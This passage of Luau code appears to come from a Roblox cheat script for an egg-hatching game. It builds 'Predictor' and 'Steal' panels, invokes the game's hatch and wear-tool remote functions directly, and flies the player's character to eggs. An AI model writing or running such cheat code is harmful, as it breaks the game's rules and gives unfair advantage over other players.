			v26.Parent = v17
			v17.Parent = v3
			table.insert(tbl25, scrollingFrame:GetPropertyChangedSignal("AbsoluteSize"):Connect(fn41))
			table.insert(tbl25, v26:GetPropertyChangedSignal("AbsoluteSize"):Connect(fn28))
			return true
		end

		local function fn54()
			if not flag2 then
				return
			end
			flag2 = false
			n13 += 1
			flag6 = false
			flag8 = false

			if flag4 then
				flag4 = false

				if not fn34() then
					fn36(false, true)
				end
			end

			if tween then
				tween:Cancel()
				tween = nil
			end

			tbl6.DisconnectAll(tbl25)
			table.clear(tbl23)
			table.clear(tbl24)

			if v17 then
				v17:Destroy()
			end

			if v21 then
				v21:Destroy()
			end

			v17 = nil
			v18 = nil
			position = nil
			title = nil
			v19 = nil
			v20 = nil
			v21 = nil
			n14 = 0
			tbl21 = nil
			tbl22 = nil
			n15 = 1
			v14 = nil
		end

		fn20 = function()
			if flag2 then
				return
			end
			local v26 = fn21()

			if not v26 then
				if not flag3 then
					flag3 = true

					task.delay(2, function()
						flag3 = false

						if not flag2 and tbl4.Toggle(nil, true) then
							fn20()
						end
					end)
				end

				return
			end

			v14 = v26
			flag2 = true
			n13 += 1
			local v27 = n13
			uiStroke = v14.ActivePets.Frame:FindFirstChildOfClass("UIStroke")
			thickness = uiStroke and uiStroke.Thickness or nil
			tbl26.Panel = thickness or 2.3120369911193848
			local uiStrokeClr = v14.Pets:FindFirstChild("UIStrokeClr")
			tbl26.Hud = uiStrokeClr and uiStrokeClr:IsA("UIStroke") and uiStrokeClr.Thickness or 2.3120369911193848
			if not fn51() or not fn53() then
				fn54()
				return
			end

			if flag5 then
				flag5 = false
				task.spawn(fn49)
			end

			table.insert(tbl25, RunService.RenderStepped:Connect(fn52))

			if uiStroke then
				table.insert(tbl25, uiStroke:GetPropertyChangedSignal("Thickness"):Connect(fn27))
			end

			for _, v28 in ipairs({ v14.ActivePets, v14.GrowingEggs }) do
				if v28 then
					table.insert(tbl25, v28:GetPropertyChangedSignal("Enabled"):Connect(function()
						if v28.Enabled and flag4 then
							fn50(false)
						end
					end))
				end
			end

			local eggState = tbl.EggState

			if type(eggState) == "table" then
				for _, v28 in ipairs({ "FieldRefreshed", "FieldShifted", "FieldGone", "FieldClaimed", "SnapshotRefreshed" }) do
					local v29 = eggState[v28]

					if type(v29) == "table" and type(v29.Connect) == "function" then
						local ok, result = pcall(v29.Connect, v29, fn46)

						if ok and result then
							table.insert(tbl25, result)
						end
					end
				end
			end

			local areaEggSlotsClient = workspace:FindFirstChild("AreaEggSlotsClient")

			if areaEggSlotsClient then
				table.insert(tbl25, areaEggSlotsClient.ChildAdded:Connect(fn46))
				table.insert(tbl25, areaEggSlotsClient.ChildRemoved:Connect(fn46))
			end

			task.spawn(function()
				local n23 = 0

				while true do
					if flag2 and v27 == n13 then
						n23 += task.wait(0.5)

						if not (not flag2 or v27 ~= n13) then
							if not (v14.Eggs:IsDescendantOf(game) and v14.ActivePets:IsDescendantOf(game)) then
								task.defer(function()
									fn54()

									if tbl4.Toggle(nil, true) then
										fn20()
									end
								end)

								break
							else
								if n23 >= n4 then
									fn46()
									n23 = 0
								elseif flag4 then
									fn40()
								end

								continue
							end
						end
					end

					break
				end
			end)

			task.spawn(pcall, fn48, v27)
		end

		fn4(function()
			fn54()

			if v15 then
				v15:Destroy()
			end

			fn32(nil)
			v15 = nil
			v16 = nil
			imageLabel = nil
		end)

		tbl4.RestoreStealPanel = function()
			if v22:Get() ~= true then
				return
			end

			if flag2 and v17 and not flag4 then
				task.spawn(fn49)
			else
				flag5 = true
			end
		end

		task.defer(fn20)
		v11 = v2:CreateTab({ Name = "Predictor", SectionsExpanded = true })
		v7 = v11:CreateSection({ Name = "Discord Webhook", Expanded = false })
		v12 = v11:CreateSection({ Name = "Egg Predictor", Expanded = true })
		v8 = v11:CreateSection({ Name = "Lab Predictor", Expanded = true })
		v9 = v11:CreateSection({ Name = "Fuse Predictor", Expanded = false })

		local function fn55(arg, arg2)
			local ok, result = pcall(Font.new, arg, arg2, Enum.FontStyle.Normal)
			return ok and result or nil
		end

		tbl12 = {
			Ready = type(v12.CreateCanvas) == "function",
			Bullet = utf8.char(8226),
			Color = {
				Text = "#FFFFFF",
				Income = "#4DFF7A",
				Clock = "#FFC24D",
				Ready = "#4DFF7A",
				Growing = "#FFC24D",
				Inventory = "#7FD8FF",
				Weight = "#CDE7FF",
				Scale = "#FFDF8A",
				Separator = "#7A8CC0",
				Hint = "#9FB8FF",
			},
			NameFont = fn55("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.ExtraBold),
		}

		tbl12.RarityFont = fn55("rbxassetid://12187365977", Enum.FontWeight.Bold) or fn55("rbxasset://fonts/families/FredokaOne.json", Enum.FontWeight.Regular)
		local sequence2 = tbl6.Sequence
		local tbl30 = {}
		local tbl31 = { 0, Color3.fromRGB(255, 255, 255) }
		local tbl32 = { 0.5, Color3.fromRGB(222, 238, 255) }
		local tbl33 = { 1, Color3.fromRGB(255, 255, 255) }
		tbl30[1] = tbl31
		tbl30[2] = tbl32
		tbl30[3] = tbl33
		tbl12.NameGradient = sequence2(tbl30)
	end

	local sequence2 = tbl6.Sequence
	local tbl19 = {}
	local tbl20 = { 0, Color3.fromRGB(255, 255, 255) }
	local tbl21 = { 0.2, Color3.fromRGB(206, 212, 224) }
	local tbl22 = { 0.42, Color3.fromRGB(74, 80, 94) }
	local tbl23 = { 0.58, Color3.fromRGB(42, 46, 56) }
	local tbl24 = { 0.78, Color3.fromRGB(158, 166, 182) }
	local tbl25 = { 1, Color3.fromRGB(250, 252, 255) }
	tbl19[1] = tbl20
	tbl19[2] = tbl21
	tbl19[3] = tbl22
	tbl19[4] = tbl23
	tbl19[5] = tbl24
	tbl19[6] = tbl25
	tbl12.SecretGradient = sequence2(tbl19)
	tbl12.SecretRotation = 90

	tbl12.Paint = function(arg, arg2)
		return string.format("<font color=\"%s\">%s</font>", arg, arg2)
	end

	tbl12.Bold = function(arg)
		return "<b>" .. tostring(arg) .. "</b>"
	end

	tbl12.Escape = function(arg)
		return (string.gsub(tostring(arg), "[<>&]", { ["<"] = "&lt;", [">"] = "&gt;", ["&"] = "&amp;" }))
	end

	tbl12.Separator = function()
		return tbl12.Paint(tbl12.Color.Separator, "  " .. tbl12.Bullet .. "  ")
	end

	tbl12.FormatRate = function(arg)
		local n13 = tonumber(arg) or 0
		if n13 >= 1e12 then
			return string.format("%.2fT/s", n13 / 1e12)
		end

		if n13 >= 1e9 then
			return string.format("%.2fB/s", n13 / 1e9)
		end

		if n13 >= 1000000 then
			return string.format("%.2fM/s", n13 / 1000000)
		end

		if n13 >= 1000 then
			return string.format("%.1fK/s", n13 / 1000)
		end
		return string.format("%d/s", math.floor(n13))
	end

	tbl12.FormatWeight = function(arg)
		local n13 = tonumber(arg) or 0
		local str = n13 >= 1000 and string.format("%.0f", n13) or string.format("%.2f", n13)
		local v13, v14 = string.match(str, "^(%-?%d+)(%.%d+)$")
		str = v13 or str
		local v15

		while true do
			local v16
			v15, v16 = string.gsub(str, "^(%-?%d+)(%d%d%d)", "%1,%2")

			if v16 ~= 0 then
				str = v15
			else
				break
			end
		end

		return v15 .. (v14 or "") .. " Kg"
	end

	tbl12.FormatClock = function(arg)
		local n13 = math.max(0, math.floor(tonumber(arg) or 0))
		return string.format("%02dh %02dm %02ds", math.floor(n13 / 3600), math.floor(n13 % 3600 / 60), n13 % 60)
	end

	tbl12.ScaleFactor = function(arg)
		if arg > 5 then
			return (arg / 5) ^ 1.2 * 19.637875755794113
		end
		return arg ^ 1.85
	end

	tbl12.MutationMultiplier = function(arg)
		arg = type(arg) == "table" and arg or {}
		local mutations = tbl.Mutations

		if type(mutations) == "table" and type(mutations.EarningsFor) == "function" then
			local ok, result = pcall(mutations.EarningsFor, arg)
			if ok and type(result) == "number" then
				return result
			end
		end

		return 1
	end

	local tbl26 = {
		Golden = "#FFD34D",
		Silver = "#E6EEF7",
		Sakura = "#FF9ED8",
		GreatBloom = "#7CFFC4",
		Boss = "#FF7A7A",
		Monstrous = "#C08BFF",
	}

	local tbl27 = { "#FF6B6B", "#FFB36B", "#FFF06B", "#6BFF8A", "#6BC8FF", "#B96BFF" }

	tbl12.MutationText = function(arg)
		local tbl28 = {}

		if type(arg) == "table" then
			for _, v13 in ipairs(arg) do
				local v14 = string.upper(fn7(v13))

				if v13 == "Rainbow" or v13 == "Prismatic" then
					local tbl29 = {}

					for i = 1, #v14 do
						table.insert(tbl29, tbl12.Paint(tbl27[(i - 1) % #tbl27 + 1], string.sub(v14, i, i)))
					end

					local insert = table.insert
					local v15 = table.pack(tbl12.Bold(table.concat(tbl29)))
					insert(tbl28, table.unpack(v15, 1, v15.n))
				else
					table.insert(tbl28, tbl12.Bold(tbl12.Paint(tbl26[v13] or "#8FE3FF", tbl12.Escape(v14))))
				end
			end
		end

		return table.concat(tbl28, " ")
	end

	local rarityGradients = nil

	local function fn16(arg)
		if type(arg) == "table" and typeof(arg.RarityGradient) == "Instance" then
			return arg.RarityGradient
		end

		if rarityGradients == nil then
			local assets = ReplicatedStorage:FindFirstChild("Assets")
			assets = assets and assets:FindFirstChild("UI")
			rarityGradients = assets and assets:FindFirstChild("RarityGradients") or false
		end

		if not rarityGradients or type(arg) ~= "table" then
			return nil
		end
		local v13 = rarityGradients:FindFirstChild(tostring(arg._id or arg.DisplayName or ""))
		return v13 and v13:FindFirstChild("RarityGradient") or nil
	end

	local tbl28 = {}

	tbl12.AssetInfo = function(arg)
		local category = tostring(arg)
		local v13 = tbl28[category]
		if v13 then
			return v13
		end
		local directory = tbl.Assets and tbl.Assets.Directory
		local flag2 = type(directory) == "table" and directory[category] or nil

		if flag2 == nil and type(directory) == "table" then
			local v14 = string.gsub(string.lower(category), "[^%a%d]", "")

			for k, v15 in pairs(directory) do
				if type(v15) == "table" then
					local tbl29 = {}
					local str = tostring(k)
					local str2 = tostring(v15._id or "")
					local v16 = tostring
					local displayName = v15.DisplayName or ""
					local v17 = table.pack(v16(displayName))
					tbl29[1] = str
					tbl29[2] = str2

					do
						local values = table.pack(table.unpack(v17, 1, v17.n))
						table.move(values, 1, values.n, 3, tbl29)
					end

					local egg = type(v15.Egg) == "table" and v15.Egg or nil

					if egg ~= nil then
						tbl29[#tbl29 + 1] = tostring(egg.ModelName or "")
					end

					for _, v18 in ipairs(tbl29) do
						if v18 ~= "" and string.gsub(string.lower(v18), "[^%a%d]", "") == v14 then
							flag2 = v15
							break
						end
					end
				end

				if flag2 == nil then
					continue
				end
				break
			end
		end

		local rarity = type(flag2) == "table" and type(flag2.Rarity) == "table" and flag2.Rarity or nil
		local icon = type(flag2) == "table" and flag2.Icon or nil
		local rarity2

		if rarity then
			rarity2 = tostring(rarity.DisplayName or rarity._id or "Common")
		else
			rarity2 = rarity
		end

		rarity2 = rarity2 or "Common"
		local color3 = rarity and typeof(rarity.Color) == "Color3" and rarity.Color or Color3.fromRGB(255, 255, 255)
		local tbl29 = {}
		local name = type(flag2) == "table"

		if name then
			name = tostring(flag2.DisplayName or category)
		end

		tbl29.Name = name or category
		tbl29.Category = category
		tbl29.Rarity = rarity2
		local rarityNumber

		if rarity then
			rarityNumber = tonumber(rarity.RarityNumber or rarity.Rank)
		else
			rarityNumber = rarity
		end

		tbl29.RarityNumber = rarityNumber or 0
		tbl29.Color = color3
		tbl29.Hex = "#" .. string.upper(color3:ToHex())
		tbl29.Gradient = fn16(rarity)
		tbl29.EarningRate = type(flag2) == "table" and tonumber(flag2.EarningRate) or 0
		tbl29.Icon = type(icon) == "string" and icon ~= "" and icon or nil
		tbl28[category] = tbl29
		return tbl29
	end

	tbl12.Income = function(arg, arg2, arg3)
		if type(arg2) ~= "number" or arg2 <= 0 then
			return 0
		end
		return math.max(math.round(arg.EarningRate * tbl12.ScaleFactor(arg2) * tbl12.MutationMultiplier(arg3)), 1)
	end

	local function isShown(arg)
		if typeof(arg) ~= "Instance" or not arg:IsDescendantOf(game) then
			return false
		end

		while arg do
			if arg:IsA("GuiObject") and not arg.Visible then
				return false
			end

			if arg:IsA("LayerCollector") then
				return arg.Enabled
			end
			arg = arg.Parent
		end

		return false
	end

	tbl12.PageVisible = function()
		local ok, result = pcall(function()
			return v11.Page
		end)

		if not ok or typeof(result) ~= "Instance" then
			return true
		end
		return isShown(result) and result.AbsoluteSize.X > 0
	end

	tbl12.IsShown = isShown
	local tbl29 = { "Value", "Rarity", "Time Left" }

	local tbl30 = {
		{ Key = "Ready", Title = "READY TO HATCH", Color = tbl12.Color.Ready },
		{ Key = "Growing", Title = "GROWING", Color = tbl12.Color.Growing },
		{ Key = "Inventory", Title = "IN INVENTORY", Color = tbl12.Color.Inventory },
	}

	local n13 = 1
	local paint2 = tbl12.Paint
	local bold2 = tbl12.Bold
	local color3 = tbl12.Color
	local tbl31 = { Sort = tbl29[1], Spotlight = true }
	local id = nil
	local n14 = 0.0909
	local v13 = nil
	local tbl32 = {}
	local tbl33 = {}
	local tbl34 = {}
	local tbl35 = {}
	local n15 = 0
	local n16 = 0
	local n17 = 0.06
	local n18 = -1
	local n19 = -1
	local n20 = -1
	local n21 = 4
	local n22 = 3
	local flag2 = false
	local n23 = 0
	local flag3 = true
	local n24 = 0
	local flag4 = false
	local v14 = nil

	local function requestEggRefresh()
		flag3 = true
	end

	local function fn17(arg)
		if not arg or arg.DiffWrapped then
			return arg
		end
		local set = arg.Set
		arg.DiffWrapped = true

		arg.Set = function(arg2)
			if type(arg2) ~= "table" then
				return set(arg2)
			end
			local spec = arg.Spec
			local tbl36 = nil

			for k, v15 in pairs(arg2) do
				if spec[k] ~= v15 then
					tbl36 = tbl36 or {}
					tbl36[k] = v15
				end
			end

			if tbl36 then
				set(tbl36)
			end

			return arg
		end

		return arg
	end

	local function fn18(arg, arg2)
		local v15 = string.gsub(tostring(arg.Spec.Text or ""), "%d", "0")
		return tostring(n16) .. "|" .. tostring(arg2) .. "|" .. v15
	end

	local function fn19(arg, arg2)
		local eggRecords = tbl.EggRecords
		if type(eggRecords) ~= "table" or type(eggRecords.GrowthSecondsRemaining) ~= "function" then
			return 0, 0
		end
		local n25 = 1

		if type(eggRecords.GrowthSpeedMultiplier) == "function" then
			local ok, result = pcall(eggRecords.GrowthSpeedMultiplier, arg)
			ok = ok and type(result) == "number"
			local n26 = 1

			if ok then
				n25 = result
			else
				n25 = n26
			end
		end

		local ok, result = pcall(eggRecords.GrowthSecondsRemaining, arg, arg2, n25)
		local flag5 = ok and type(result) == "number"
		local n26 = 0

		if not flag5 then
			result = n26
		end

		local n27 = 0

		if type(eggRecords.GrowthDuration) == "function" then
			local ok2
			ok2, n27 = pcall(eggRecords.GrowthDuration, arg)
			local flag6 = ok2 and type(n27) == "number"
			local n28 = 0

			if not flag6 then
				n27 = n28
			end
		end

		return result, n27
	end

	local function fn20(arg)
		local eggRecords = tbl.EggRecords

		if type(eggRecords) == "table" and type(eggRecords.WeightKg) == "function" then
			local ok, result = pcall(eggRecords.WeightKg, arg)
			if ok and type(result) == "number" then
				return result
			end
		end

		return 0
	end

	local function fn21()
		local eggState = tbl.EggState
		if type(eggState) ~= "table" or type(eggState.ReadOwnerEggs) ~= "function" then
			return nil
		end
		local ok, result = pcall(eggState.ReadOwnerEggs, localPlayer.UserId)
		if not ok or type(result) ~= "table" then
			return nil
		end
		local serverTimeNow = workspace:GetServerTimeNow()
		local tbl36 = {}

		for k, v15 in pairs(result) do
			if type(v15) == "table" then
				local v16 = tbl12.AssetInfo(v15.AssetCategory)
				local n25 = tonumber(v15.AssetScale) or 0
				local mutations = type(v15.Mutations) == "table" and v15.Mutations or {}

				local tbl37 = {
					Id = k,
					Info = v16,
					Scale = n25,
					Weight = fn20(v15),
					Mutations = mutations,
					Income = tbl12.Income(v16, n25, mutations),
					Status = "Inventory",
					Remaining = math.huge,
					Percent = 0,
				}

				if v15.Placement ~= nil then
					local ok2, result2 = pcall(eggState.IsReadyToHatch, k)

					if ok2 and result2 then
						tbl37.Status = "Ready"
						tbl37.Remaining = 0
						tbl37.Percent = 100
					else
						local v17, v18 = fn19(v15, serverTimeNow)
						tbl37.Status = "Growing"
						tbl37.Remaining = v17

						if v18 > 0 then
							tbl37.Percent = math.clamp(math.floor((1 - v17 / v18) * 100), 0, 100)
						end
					end
				end

				table.insert(tbl36, tbl37)
			end
		end

		return tbl36
	end

	local function fn22(arg)
		local sort = tbl31.Sort

		table.sort(arg, function(arg2, arg3)
			if sort == tbl29[2] and arg2.Info.RarityNumber ~= arg3.Info.RarityNumber then
				return arg2.Info.RarityNumber > arg3.Info.RarityNumber
			end

			if sort == tbl29[3] and arg2.Remaining ~= arg3.Remaining then
				return arg2.Remaining < arg3.Remaining
			end
			return arg2.Income > arg3.Income
		end)
	end

	local function fn23(arg)
		if arg.Status == "Ready" then
			return bold2(paint2(color3.Ready, "Ready to hatch"))
		end

		if arg.Status == "Growing" then
			return bold2(paint2(color3.Clock, tbl12.FormatClock(arg.Remaining))) .. tbl12.Separator() .. paint2(color3.Growing, arg.Percent .. "%")
		end
		return paint2(color3.Inventory, "In inventory")
	end

	local function fn24(arg)
		local tbl36 = {}
		local v15 = tbl12.MutationText(arg.Mutations)
		table.insert(tbl36, bold2(paint2(color3.Income, tbl12.FormatRate(arg.Income))))
		table.insert(tbl36, paint2(color3.Scale, string.format("%.2fx", arg.Scale)))
		table.insert(tbl36, paint2(color3.Weight, tbl12.FormatWeight(arg.Weight)))

		if v15 ~= "" then
			table.insert(tbl36, v15)
		end

		return table.concat(tbl36, tbl12.Separator())
	end

	local n25 = 5
	local n26 = n25 + 0.8
	local n27 = 1.2
	local n28 = 1.2
	local n29 = 0.936
	local n30 = 2.3
	local n31 = 0.25
	local n32 = 0.18
	local n33 = n30 + 0.6
	local n34 = 0.24
	local n35 = 0.22

	local function fn25(arg)
		if string.upper(tostring(arg.Rarity)) == "SECRET" then
			return tbl12.SecretGradient
		end
		return arg.Gradient
	end

	local function fn26(arg)
		return fn25(arg) ~= nil and Color3.fromRGB(255, 255, 255) or arg.Color
	end

	local function fn27(arg)
		if string.upper(tostring(arg.Rarity)) == "SECRET" then
			return tbl12.SecretRotation
		end
		return nil
	end

	local function fn28(arg)
		local v15 = arg and arg.Get()
		if not v15 or n16 <= 0 then
			return nil
		end

		if v15.Text ~= tostring(arg.Spec.Text or "") then
			return nil
		end
		return v15
	end

	local function fn29(arg)
		local v15 = fn18(arg, "w")
		if arg.WidthKey == v15 then
			return arg.WidthUnits
		end
		local v16 = fn28(arg)
		if not v16 then
			return nil
		end
		local size = v16.Size
		local textWrapped = v16.TextWrapped
		v16.TextWrapped = false
		v16.Size = UDim2.fromOffset(100000, math.max(1, size.Y.Offset))
		local x = v16.TextBounds.X
		v16.Size = size
		v16.TextWrapped = textWrapped
		if x <= 0 then
			return nil
		end
		local widthUnits = x / n16
		arg.WidthKey = v15
		arg.WidthUnits = widthUnits
		return arg.WidthUnits
	end

	local function fn30(arg, arg2)
		local v15 = fn18(arg, math.floor(arg2 * 100 + 0.5))
		if arg.HeightKey == v15 then
			return arg.HeightUnits
		end
		local v16 = fn28(arg)
		if not v16 then
			return nil
		end
		local size = v16.Size
		v16.Size = UDim2.fromOffset(math.max(1, math.floor(arg2 * n16 + 0.5)), 100000)
		local y = v16.TextBounds.Y
		v16.Size = size
		if y <= 0 then
			return nil
		end
		local heightUnits = y / n16
		arg.HeightKey = v15
		arg.HeightUnits = heightUnits
		return arg.HeightUnits
	end

	local function fn31(arg)
		local rfEggWorldAskHatch = networking:FindFirstChild("RF/EggWorld/AskHatch")
		if not rfEggWorldAskHatch or not rfEggWorldAskHatch:IsA("RemoteFunction") then
			return false
		end
		local ok, result = pcall(rfEggWorldAskHatch.InvokeServer, rfEggWorldAskHatch, arg)
		if not ok or result == false then
			return false
		end
		task.wait(0.35)
		local rfEggWorldAskFinishHatch = networking:FindFirstChild("RF/EggWorld/AskFinishHatch")

		if rfEggWorldAskFinishHatch and rfEggWorldAskFinishHatch:IsA("RemoteFunction") then
			pcall(rfEggWorldAskFinishHatch.InvokeServer, rfEggWorldAskFinishHatch, arg)
		end

		return true
	end

	tbl32.RunAction = function()
		local focus = tbl32.Focus
		if type(focus) ~= "table" or focus.Id == nil then
			return
		end
		local str = tostring(focus.Id)

		if focus.Status == "Inventory" then
			local eggState = tbl.EggState
			if type(eggState) == "table" and type(eggState.WearEggTool) == "function" and pcall(eggState.WearEggTool, str) then
				return
			end
			local rfEggWorldAskWearTool = networking:FindFirstChild("RF/EggWorld/AskWearTool")

			if rfEggWorldAskWearTool and rfEggWorldAskWearTool:IsA("RemoteFunction") then
				pcall(rfEggWorldAskWearTool.InvokeServer, rfEggWorldAskWearTool, str)
			end

			return
		end

		if focus.Status == "Ready" then
			if not tbl32.Hatching then
				tbl32.Hatching = true
				pcall(fn31, str)
				tbl32.Hatching = false
			end

			return
		end

		if tbl32.Flying or type(tbl4.FlyTo) ~= "function" then
			return
		end
		local placedEggRenders = workspace:FindFirstChild("PlacedEggRenders")
		local v15 = nil

		if placedEggRenders then
			for _, child in ipairs(placedEggRenders:GetChildren()) do
				if string.find(child.Name, str, 1, true) or child:GetAttribute("Uid") == str then
					v15 = child
					break
				end
			end
		end

		if not v15 then
			return
		end

		local ok, result = pcall(function()
			return v15:IsA("Model") and v15:GetPivot() or v15.CFrame
		end)

		if not ok then
			return
		end
		local movement = tbl4.Movement
		if movement.Owner ~= nil and movement.Owner ~= "treadmill" or movement.PlaceWanted or tbl4.Steal.Active or tbl4.Steal.Wanted or tbl4.Steal.Carrying then
			return
		end
		tbl32.Flying = true

		if tbl4.ClaimMovement("predictor") then
			if tbl4.Treadmill.Riding or tbl4.OnBelt() then
				pcall(tbl4.ExitBelt)
			end

			pcall(tbl4.FlyTo, result.Position + Vector3.new(0, 3, 0), function()
				return false
			end, "fly")

			tbl4.ReleaseMovement("predictor")
		end

		tbl32.Flying = false
	end

	local function fn32(arg)
		v13 = arg
		arg:SetDock(5, { Gap = n35, DividerColor = Color3.fromRGB(170, 174, 184) })
		local v15 = arg:Dock()

		tbl32.Icon = arg:Image({
			Parent = v15,
			X = 0,
			Y = 0,
			Width = n25,
			Height = n25,
			Corner = 0.35,
			Background = "#000000",
			BackgroundTransparency = 0.26,
			StrokeThickness = n14,
			StrokeTransparency = 0,
			ZIndex = 8,
		})

		tbl32.Name = arg:Text({
			Parent = v15,
			X = n26,
			Y = 0,
			Height = n27,
			Scale = n28,
			Wrap = false,
			Gradient = tbl12.NameGradient,
			TextStrokeTransparency = 1,
			ZIndex = 9,
		})

		tbl32.Rarity = arg:Text({
			Parent = v15,
			X = n26,
			Y = 0,
			Height = n27,
			Scale = n29,
			Wrap = false,
			Font = tbl12.RarityFont,
			TextStrokeTransparency = 1,
			StrokeTransparency = 0.08,
			ZIndex = 9,
		})

		tbl32.Info = arg:Text({ Parent = v15, X = n26, Y = n27, Height = n25 - n27, Wrap = false, ZIndex = 9 })

		tbl32.Action = arg:Button({
			Parent = v15,
			X = 0,
			Y = 0,
			Width = 5,
			Height = n27 - 0.1,
			Text = "",
			Scale = 1,
			Background = "#000000",
			BackgroundTransparency = 0.55,
			HoverTransparency = 0.3,
			PressTransparency = 0.15,
			Corner = 0.35,
			StrokeColor = Color3.fromRGB(255, 255, 255),
			StrokeThickness = n14,
			StrokeTransparency = 0.6,
			Visible = false,
			ZIndex = 10,
			Callback = function()
				if type(tbl32.RunAction) == "function" then
					task.spawn(tbl32.RunAction)
				end
			end,
		})

		arg:OnResize(function(arg2, arg3, arg4)
			if arg3 == n18 and arg4 == n19 then
				return
			end
			n18 = arg3
			n19 = arg4
			n15 = arg3 / math.max(arg4, 1)
			n16 = arg4
			n23 = 2
			n17 = 0.9 / math.max(arg:TextSize(), 1)
			tbl32.Rarity.Set({ StrokeThickness = n17 })

			for _, v16 in ipairs(tbl33) do
				v16.Rarity.Set({ StrokeThickness = n17 })
			end
		end)

		for _, v16 in ipairs({ "Icon", "Name", "Rarity", "Info", "Action" }) do
			fn17(tbl32[v16])
		end
	end

	local function fn33(arg)
		local v15 = tbl34[arg]

		if not v15 then
			local v16 = v13:Text({ Name = "Line", X = 0, Y = 0, Width = 1, Height = 1, Wrap = true, Visible = false })
			tbl34[arg] = fn17(v16)
			v15 = v16
		end

		return v15
	end

	local function fn34(arg)
		local v15 = tbl33[arg]
		if v15 then
			return v15
		end
		local tbl36 = {}

		tbl36.Frame = v13:Button({
			Name = "Entry",
			Text = "",
			Background = "#000000",
			BackgroundTransparency = 0.74,
			HoverTransparency = 0.46,
			PressTransparency = 0.3,
			Corner = 0.35,
			X = 0,
			Y = 0,
			Width = 1,
			Height = 1,
			Visible = false,
			Callback = function()
				if tbl36.Id ~= nil then
					id = tbl36.Id
					requestEggRefresh()
				end
			end,
		})

		tbl36.Icon = v13:Image({
			Parent = tbl36.Frame,
			X = n31,
			Y = 0,
			Width = n30,
			Height = n30,
			Corner = 0.35,
			Background = "#000000",
			BackgroundTransparency = 0.45,
			StrokeThickness = n14,
			StrokeTransparency = 0,
		})

		tbl36.Name = v13:Text({
			Parent = tbl36.Frame,
			X = n31 + n33,
			Y = 0,
			Width = 1,
			Height = n27,
			Scale = n28,
			Wrap = false,
			Gradient = tbl12.NameGradient,
			TextStrokeTransparency = 1,
		})

		tbl36.Rarity = v13:Text({
			Parent = tbl36.Frame,
			X = n31 + n33,
			Y = 0,
			Width = 1,
			Height = n27,
			Scale = n29,
			Wrap = false,
			Font = tbl12.RarityFont,
			TextStrokeTransparency = 1,
			StrokeTransparency = 0.08,
			StrokeThickness = n17,
		})

		tbl36.Detail = v13:Text({
			Parent = tbl36.Frame,
			X = n31 + n33,
			Y = n27,
			Width = math.max(1, n15 - n33 - n31 * 2),
			Height = 1,
			Wrap = true,
		})

		tbl36.Status = v13:Text({ Parent = tbl36.Frame, X = 0, Y = 0, Width = 1, Height = n27, Wrap = false, Align = "Right" })

		for _, v16 in ipairs({ "Frame", "Icon", "Name", "Rarity", "Detail", "Status" }) do
			fn17(tbl36[v16])
		end

		tbl33[arg] = tbl36
		return tbl36
	end

	local function fn35(arg)
		local tbl36 = { Ready = 0, Growing = 0, Inventory = 0 }
		local n36 = 0
		local v15 = nil

		for _, v16 in ipairs(arg) do
			local status = v16.Status
			tbl36[status] = tbl36[status] + 1
			n36 += v16.Income

			if not v15 or v16.Income > v15.Income then
				v15 = v16
			end
		end

		return bold2(paint2(color3.Text, tostring(#arg) .. " eggs")) .. tbl12.Separator() .. bold2(paint2(color3.Ready, tbl36.Ready .. " ready")) .. tbl12.Separator() .. bold2(paint2(color3.Growing, tbl36.Growing .. " growing")) .. tbl12.Separator() .. bold2(paint2(color3.Inventory, tbl36.Inventory .. " in bag")) .. tbl12.Separator() .. paint2(color3.Text, "Total") .. " " .. bold2(paint2(color3.Income, tbl12.FormatRate(n36))), v15
	end

	local function fn36(arg, arg2)
		if arg2 == "" then
			return true
		end
		local str = " " .. arg.Status
		local v15 = string.lower(tostring(arg.Info.Name) .. " " .. tostring(arg.Info.Rarity) .. str)

		for _, mutation in ipairs(arg.Mutations) do
			v15 ..= " " .. string.lower(tostring(mutation))
		end

		return string.find(v15, arg2, 1, true) ~= nil
	end

	local function fn37(arg)
		local tbl36 = {}
		local v15 = bold2(paint2(color3.Income, tbl12.FormatRate(arg.Income)))
		local str = paint2(color3.Scale, string.format("%.2fx", arg.Scale)) .. tbl12.Separator() .. paint2(color3.Weight, tbl12.FormatWeight(arg.Weight))
		tbl36[1] = v15
		tbl36[2] = str

		do
			local values = table.pack(fn23(arg))
			table.move(values, 1, values.n, 3, tbl36)
		end

		local v16 = tbl12.MutationText(arg.Mutations)
		table.insert(tbl36, v16 ~= "" and v16 or paint2(color3.Hint, "Tap an egg below to preview it"))
		return table.concat(tbl36, "\n")
	end

	local function fn38(arg)
		local flag5 = tbl31.Spotlight and arg ~= nil

		if v14 ~= flag5 then
			v14 = flag5
			v13:SetDock(flag5 and 5 or 0, { Gap = n35 })
		end

		tbl32.Icon.Set({ Visible = flag5 })
		tbl32.Name.Set({ Visible = flag5 })
		tbl32.Rarity.Set({ Visible = flag5 })
		tbl32.Info.Set({ Visible = flag5 })
		tbl32.Action.Set({ Visible = flag5 })
		tbl32.Focus = flag5 and arg or nil
		if not flag5 then
			return
		end
		local info = arg.Info

		tbl32.Action.Set({
			Text = arg.Status == "Inventory" and bold2(paint2(color3.Inventory, "Hold egg")) or arg.Status == "Ready" and bold2(paint2(color3.Ready, "Hatch egg")) or bold2(paint2(color3.Growing, "Fly to egg")),
		})

		tbl32.Icon.Set({ Visible = info.Icon ~= nil, Image = info.Icon or "", StrokeColor = info.Color })
		tbl32.Name.Set({ Text = tbl12.Escape(info.Name) })

		tbl32.Rarity.Set({
			Text = string.upper(tostring(info.Rarity)),
			Color = fn26(info),
			Gradient = fn25(info),
			GradientRotation = fn27(info),
		})

		tbl32.Info.Set({ Text = fn37(arg) })
	end

	local function fn39(arg, arg2)
		local info = arg2.Info
		arg.Id = arg2.Id
		arg.Frame.Set({ Visible = true, BackgroundTransparency = arg2.Id == id and 0.12 or 0.74 })
		arg.Icon.Set({ Visible = info.Icon ~= nil, Image = info.Icon or "", StrokeColor = info.Color })
		arg.Name.Set({ Text = tbl12.Escape(info.Name) })

		arg.Rarity.Set({
			Text = string.upper(tostring(info.Rarity)),
			Color = fn26(info),
			Gradient = fn25(info),
			GradientRotation = fn27(info),
		})

		arg.Detail.Set({ Text = fn24(arg2) })
		arg.Status.Set({ Text = fn23(arg2) })
	end

	local function fn40()
		if n15 <= 0 then
			return
		end
		flag2 = false
		local n36 = math.max(1, n15 - n26)
		local v15 = fn29(tbl32.Action)

		if v15 then
			tbl32.ActionUnits = v15 + 1.4
		else
			flag2 = true
		end

